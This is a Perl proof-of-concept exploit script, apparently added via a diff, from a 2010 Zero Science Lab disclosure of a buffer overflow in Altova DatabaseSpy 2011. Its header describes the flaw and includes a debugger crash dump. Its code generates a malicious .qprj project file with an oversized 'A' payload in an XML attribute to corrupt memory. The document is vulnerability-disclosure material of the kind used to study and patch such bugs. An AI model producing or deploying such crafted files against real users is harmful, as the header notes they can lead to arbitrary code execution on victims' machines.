@@ -1,0 +1,151 @@
+#!/usr/bin/perl
+#
+#
+# Title: Altova DatabaseSpy 2011 Project File Handling Buffer Overflow Vulnerability
+#
+#
+# Vendor: Altova GmbH
+# Product web page: http://www.altova.com
+# Affected version: Enterprise Edition 2011
+#
+#
+# Summary: Altova DatabaseSpy® 2011 is the unique multi-database query, design,
+# and database comparison tool. It connects to all major databases, easing SQL
+# editing, database structure design, database content editing, database schema
+# and content comparison, and database conversion for a fraction of the cost of
+# single-database solutions.
+#
+#
+# Desc: The Altova DatabaseSpy 2011 Enterprise Edition suffers from a buffer
+# overflow/memory corruption vulnerability when handling project files (.qprj).
+# The issue is triggered because there is no boundry checking of some XML tag
+# property values, ex: <Folder FolderName="SQL" Type="AAAAAAA..../>" (~1000 bytes).
+# This can aid the attacker to execute arbitrary machine code in the context of an
+# affected node (locally and remotely) via file crafting or computer-based social
+# engineering.
+#
+#
+# Tested on: Microsoft Windows XP Professional SP3 (English)
+#
+#
+#----------------------------------------------------------------------------------#
+#
+#   (342c.37c0): Access violation - code c0000005 (first chance)
+#   First chance exceptions are reported before any exception handling.
+#   This exception may be expected and handled.
+#   eax=04430041 ebx=0203ff98 ecx=0443deda edx=56413f2e esi=0022dd98 edi=00000016
+#   eip=00420b83 esp=0022dc00 ebp=00000017 iopl=0         nv up ei pl nz na po nc
+#   cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+#   *** ERROR: Symbol file could not be found.  Defaulted to export symbols for
+#   DatabaseSpy.exe - DatabaseSpy+0x20b83:
+#   00420b83 663b02          cmp     ax,word ptr [edx]        ds:0023:56413f2e=????
+#
+#----------------------------------------------------------------------------------#
+#
+#
+# Vulnerability discovered by: Gjoko 'LiquidWorm' Krstic
+#                              liquidworm gmail com
+#                              Zero Science Lab - http://www.zeroscience.mk
+#
+#
+# Vendor status: [17.10.2010] Vulnerability discovered.
+#                [17.10.2010] Initial contact with the vendor with sent PoC files.
+#                [21.10.2010] No reply from vendor.
+#                [22.10.2010] Public advisory released.
+#
+#
+# Advisory ID: ZSL-2010-4971
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4971.php
+# Advisory TXT: http://www.zeroscience.mk/codes/dbspy_bof.txt
+#
+#
+# 17.10.2010
+#
+
+use strict;
+system cls;
+
+
+sub header()
+{
+	print "
+		@=---===---===---===---===---===---===---===---=@
+		|						|
+		|	Proof Of Concept PERL script for	|
+		|						|
+		|  Altova DatabaseSpy 2011 (Enteprise Edition)  |
+		|						|
+		|						|
+		|						|
+		|						|
+		|		       ---			|
+		|						|
+		|		Copyleft (c) 2010		|
+		|						|
+		|  Zero Science Lab - http://www.zeroscience.mk |
+		|						|
+		@=---===---===---===---===---===---===---===---=@
+	\n\n";
+}
+
+my $FILENAME = "DEATH_FROM_ABOVE.qprj"; #DatabaseSpy Project File
+
+my $PAYLOAD = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA". #48
+               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+              "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+              "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+              "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+              "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+              "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+              "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+              "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+              "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+              "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
+              "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; #1008B
+
+               #21
+
+my $PROJECT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\xA<!-".
+	      "-  DatabaseSpy Project File  -->\xA<Project Vers".
+	      "ion=\"2\" Expanded=\"Yes\" Type=\"Root\" Title=".
+	      "\"test\">\xA\x9<Folder FolderName=\"Data Sources".
+	      "\" Type=\"DataSourceFolder\"/>\xA\x9<Folder Fol".
+	      "derName=\"SQL\" Type=\"SQLRootFolder\" database".
+	      "_kind=\"Unknown\" datasource=\"Offline\" descrip".
+	      "tion=\"Store and organize SQL files for this pro".
+	      "ject.\" blockingstrategy=\"semi\"/>\xA\x9<Folder".
+	      " FolderName=\"Design\" Type=\"$PAYLOAD\" databas".
+	      "e_kind=\"Unknown\" datasource=\"Offline\" descri".
+	      "ption=\"I LOVE VERONICA CORNINGSTONE.\"/>\xA\x9<".
+	      "Folder FolderName=\"Data Diff\" Type=\"DataDiffR".
+	      "ootFolder\"/>\xA\x9<Folder FolderName=\"Schema D".
+	      "iff\" Type=\"Schema DiffRootFolder\"/>\xA\x9<Fol".
+	      "der FolderName=\"Favorites\" Type=\"FavoriteFold".
+	      "er\"/>\xA</Project>\xA";
+
+sub code()
+{
+	      system ("color 3"); #~!@#$%^&*()_+|<>?:"{}=-`';/.,0
+	      open qprj, ">./$FILENAME" || die "\nCan't open #$_@ 
+	      $FILENAME: $!"; print "\n (1) "; system("pause"); #
+	      print qprj $PROJECT; print "\n (2) Buffering mali".
+	      "cious format file . . .\r\n"; sleep 2; close qprj;
+	      print "\n (3) File $FILENAME created successfully".
+	      "!\n"; sleep 2; system ("color \x44"); sleep 1; #.%
+	      print "\n (4) And the color is changed.\n";
+}
+
+print "\n";
+header();
+code();
+
+#EOF
